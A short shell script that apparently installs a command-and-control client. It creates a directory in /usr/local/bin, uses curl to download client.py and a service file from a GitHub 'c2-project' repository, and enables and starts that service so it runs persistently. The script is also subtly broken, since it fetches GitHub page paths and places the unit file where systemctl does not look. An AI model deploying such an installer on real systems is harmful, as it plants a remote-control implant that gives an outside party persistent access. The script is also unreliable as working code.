#Make directory in /usr/local/bin
mkdir /usr/local/bin/urmom
#Curl the client file into it
curl https://github.com/drew-young/c2-project/client.py > /usr/local/bin/urmom/client.py
#Curl the service file into it
curl https://github.com/drew-young/c2-project/client.service > /usr/local/bin/urmom/client.service
#Enable and start the service
systemctl enable client.service
systemctl start client.service
#Tell the user you finished
echo Finished!